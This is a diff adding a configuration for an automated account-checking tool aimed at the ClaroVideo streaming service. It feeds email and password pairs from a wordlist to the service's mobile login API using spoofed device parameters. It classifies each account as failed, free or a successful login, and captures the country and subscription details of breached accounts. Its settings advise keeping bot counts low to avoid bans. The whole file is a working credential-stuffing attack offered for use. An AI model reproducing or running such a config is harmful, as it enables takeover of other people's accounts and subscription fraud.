@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "ClaroVideo",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-11T17:36:15.3992719+00:00",
+  "AdditionalInfo": "Just run with 3 bots or less , instead of you will get banned",
+  "Author": "Paparazzi-Nicolas",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL REQUEST POST "http://mfwkmobileandroid-api.clarovideo.net/services/user/login?device_type=HUAWEI%20VNS-L21&device_id=9JT4C16922002368&api_version=v5.8&device_category=mobile&device_manufacturer=HUAWEI&device_so=Android%206.0&region=peru&authpt=12e4i8l6a581a&device_model=android&HKS=g7c1f6a56d0pepd6kedkj556f2&authpn=amco&format=json&includpaywayprofile=1" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: AndroidDlaApk AndroidDlaApkAccedo" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-newrelic-id: UgECVVNRGwUDVFFbDgQ=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"user_login_invalido\"" 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "\"subscriptions\":[]" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
+#Language PARSE "<SOURCE>" LR "\"language\":\"" "\"" Recursive=FALSE -> CAP "Language" "" "" 
+#Country PARSE "<SOURCE>" LR "country_code\":\"" "\"" Recursive=FALSE -> CAP "Country" "" "" 
+#Suscription PARSE "<SOURCE>" LR "key\":\"" "\"" Recursive=TRUE -> CAP "Suscription" "" "" 
+#NumberSuscriptions PARSE "<SOURCE>" LR "hasUserSusc\":" "," Recursive=FALSE -> CAP "NumberSuscriptions" "" "" 
